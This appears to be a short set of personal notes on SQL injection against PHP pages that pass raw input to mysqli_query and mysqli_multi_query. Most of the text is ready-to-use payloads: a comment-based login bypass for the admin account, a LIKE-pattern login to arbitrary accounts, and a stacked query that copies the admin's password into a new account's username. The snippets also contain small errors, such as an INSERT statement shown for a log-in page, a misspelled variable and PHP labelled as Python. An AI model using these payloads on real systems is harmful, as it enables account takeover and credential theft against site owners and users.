mysqli_query
```python
#on log-in page, if mysql code in php is like this
$sql = "INSERT INTO accounts (username, password) VALUES ('$userame', '$password')";
$result = mysqli_multi_query($conn, $sql);

#if no secure coding applied, the attacker can log in into any account especially if they know the victims username and they can insert malicious input like this:
admin'#
#password is anything because it will disregard because of the comment

#or any account like this:
' or username like 'a%'#
#the a% means the username that start with a and anything from the rest of the chartarter. It can be admin, ariana, amanda, anything, but the only select is the old records of username that starts with a - more like the admin huh?
```
mysqli_multi_query
```python
#on sign-up page, if mysql code in php is like this
$sql = "INSERT INTO accounts (username, password) VALUES ('$userame', '$password')";
$result = mysqli_multi_query($conn, $sql);

#and if no sanization, limit of characters of username, you can execute multiple query like this:
#you can insert malicious code on the username like this based on the sql statement to be execute:
	',''); insert into accounts (username, password) select password, 'password' from accounts where username = 'admin'#
#last is insert comment on password and confirm password
#your username should be the username's password that you type is valid so if the username is valid then the data recorded on the database will be like this
username          password
admin             adminpassword
...               ...
...               ...
adminpassword     password
```

logging in to different username
```python
' OR (username like 'a%' AND username != 'admin') and username != 'admin2' and (username != 'adminpassword') limit 1#
```